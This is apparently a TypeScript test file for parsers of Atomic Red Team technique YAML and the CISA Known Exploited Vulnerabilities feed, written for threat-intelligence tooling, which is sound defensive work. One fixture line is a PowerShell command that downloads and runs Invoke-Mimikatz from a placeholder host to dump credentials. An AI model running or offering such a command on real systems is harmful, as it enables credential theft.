import { test } from "node:test";
import assert from "node:assert/strict";
import { atomicEmulationOptions, buildAtomicResult, parseAtomicIndex } from "./atomic-red-team.ts";
import { parseKevFeed, kevStructured } from "./cisa-kev.ts";
import type { ConnectorSource } from "./common.ts";

const ATOMIC_YAML = `---
execution:
  T1059.001:
    technique:
      type: attack-pattern
      name: PowerShell
      external_references:
      - source_name: mitre-attack
        external_id: T1059.001
    atomic_tests:
    - name: Mimikatz
      auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027
      description: Download Mimikatz and dump credentials.
      supported_platforms:
      - windows
      executor:
        command: IEX (iwr 'https://example/Invoke-Mimikatz.ps1')
        name: command_prompt
        elevation_required: true
    - name: PowerShell Downgrade Attack
      auto_generated_guid: 9148e7c4-9356-420e-a416-e896e9c0f73e
      supported_platforms:
      - windows
      executor:
        name: powershell
  T1059.002:
    technique:
      name: AppleScript
    atomic_tests: []
defense-evasion:
  T1059.001:
    technique:
      name: PowerShell
    atomic_tests:
    - name: Mimikatz
      auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027
      supported_platforms: [windows]
      executor:
        name: command_prompt
  T1070.004:
    technique:
      name: File Deletion
    atomic_tests:
    - name: Delete a single file - Linux/macOS
      supported_platforms: [linux, macos]
      executor:
        name: sh
`;

const SOURCE: ConnectorSource = { id: "src_atomic", name: "Atomic Red Team", tier: 2, confidenceClass: "RESEARCH_ORG" };

test("atomic index: merges tactics, dedupes tests by GUID, skips techniques without tests", () => {
  const techs = parseAtomicIndex(ATOMIC_YAML);
  assert.deepEqual(
    techs.map((t) => t.techniqueId),
    ["T1059.001", "T1070.004"],
  );
  const ps = techs[0];
  assert.deepEqual(ps.tactics, ["execution", "defense-evasion"]);
  assert.equal(ps.tests.length, 2);
  assert.deepEqual(ps.tests[0], {
    name: "Mimikatz",
    guid: "f3132740-55bc-48c4-bcc0-758a459cd027",
    platforms: ["windows"],
    executor: "command_prompt",
    elevationRequired: true,
    description: "Download Mimikatz and dump credentials.",
  });
  assert.equal(ps.tests[1].elevationRequired, undefined);
  const opts = atomicEmulationOptions(ps);
  assert.equal(opts[0].kind, "atomic_test");
  assert.equal(opts[0].ref, "T1059.001#f3132740-55bc-48c4-bcc0-758a459cd027");
  assert.equal(opts[0].sourceUrl, "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md");
});

test("atomic result: one ATOMIC_TEST doc per technique with stable ids", () => {
  const r = buildAtomicResult(parseAtomicIndex(ATOMIC_YAML), SOURCE, { now: "2026-10-16T00:00:00.000Z" });
  assert.deepEqual(r.stats, { techniques: 2, tests: 3 });
  assert.deepEqual(
    r.docs.map((d) => d.id),
    ["art_T1059.001", "art_T1070.004"],
  );
  const d = r.docs[0];
  assert.deepEqual(d.docTypes, ["ATOMIC_TEST"]);
  assert.equal(d.sourceTier, 2);
  assert.ok(d.structured?.kind === "atomic_test" && d.structured.tests.length === 2);
  assert.match(d.extractedText, /1\. Mimikatz \[windows; command_prompt; elevation required\]/);
  assert.equal(r.emulation.length, 2);
  assert.equal(r.emulation[1].options[0].platforms.join(","), "linux,macos");
  // Deterministic: same input → same hashes (idempotent upserts).
  const again = buildAtomicResult(parseAtomicIndex(ATOMIC_YAML), SOURCE, { now: "2026-10-16T00:00:00.000Z" });
  assert.equal(again.docs[0].rawHash, d.rawHash);
});

test("atomic index rejects empty input", () => {
  assert.throws(() => parseAtomicIndex(""), /empty/);
});

const KEV = {
  title: "CISA Catalog of Known Exploited Vulnerabilities",
  catalogVersion: "2026.10.15",
  dateReleased: "2026-10-15T16:00:00.000Z",
  count: 3,
  vulnerabilities: [
    {
      cveID: "CVE-2024-3400",
      vendorProject: "Palo Alto Networks",
      product: "PAN-OS",
      vulnerabilityName: "Palo Alto Networks PAN-OS Command Injection Vulnerability",
      dateAdded: "2024-04-12",
      shortDescription: "Command injection in GlobalProtect.",
      requiredAction: "Apply mitigations per vendor instructions.",
      dueDate: "2024-04-19",
      knownRansomwareCampaignUse: "Unknown",
      notes: "",
      cwes: ["CWE-77"],
    },
    { cveID: "CVE-2024-3400", vendorProject: "dup" },
    { cveID: "not-a-cve" },
    { cveID: "cve-2023-4966", vendorProject: "Citrix", product: "NetScaler", dateAdded: "2023-10-18", knownRansomwareCampaignUse: "Known" },
  ],
};

test("KEV feed: validates and dedupes CVE ids, keeps ransomware flag", () => {
  const c = parseKevFeed(JSON.stringify(KEV));
  assert.equal(c.catalogVersion, "2026.10.15");
  assert.deepEqual(
    c.entries.map((e) => e.cveId),
    ["CVE-2024-3400", "CVE-2023-4966"],
  );
  assert.equal(c.entries[0].vendor, "Palo Alto Networks");
  assert.deepEqual(c.entries[0].cwes, ["CWE-77"]);
  assert.equal(c.entries[1].ransomwareUse, "Known");
  assert.equal(c.entries[1].name, "CVE-2023-4966");
  assert.equal(kevStructured(c.entries[0]).kind, "kev");
  assert.throws(() => parseKevFeed("{}"), /no vulnerabilities/);
});
